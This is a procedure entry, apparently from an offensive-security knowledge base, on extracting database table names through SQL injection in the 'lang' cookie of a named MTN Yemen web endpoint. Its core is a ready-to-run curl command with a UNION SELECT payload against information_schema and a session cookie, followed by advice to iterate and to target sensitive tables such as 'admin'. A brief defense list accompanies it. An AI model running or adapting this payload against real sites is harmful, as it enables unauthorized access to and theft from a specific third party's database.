---
id: proc-mtn-table-extraction
tags:
  - sqli
  - enumeration
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/sqli-table-extraction]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:10.192Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Extract-Database-Tables-via-SQL-Injection

## Summary

This procedure uses SQL injection in the lang cookie to enumerate database tables, such as the 'admin' table, via union-based or blind techniques on the MTN Yemen endpoint, enabling potential data exfiltration paths.

## Description

With confirmed injection, query information_schema.tables to list schema objects. Blind context may require conditional timing or boolean payloads for extraction. Limited by permissions, but reveals sensitive structures like admin tables.

## Requirements

1. Blind SQLi confirmed
2. Knowledge of MySQL schema queries

## Defense

Defensive measures and detection strategies:

- Restrict database user privileges to minimal
- Disable information_schema access for app users
- Audit queries for union/select patterns

## Objectives

1. Retrieve table names
2. Identify sensitive tables for further targeting

## Instructions

### Step 1: Union-Based Table Query

**Context**: Append UNION SELECT to extract from information_schema (adapt for blind if needed).

**Command** ([[commands/sqli-table-extraction]]):
```bash
curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" \
  -H "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()-- ; _ga=GA1.3.1859249834.1576704214" \
  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

> Look for reflected table names like 'admin' in response or infer via errors/timing; iterate for full list.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqli-table-extraction]]

## Tools Used


## Tags

- sqli
- enumeration
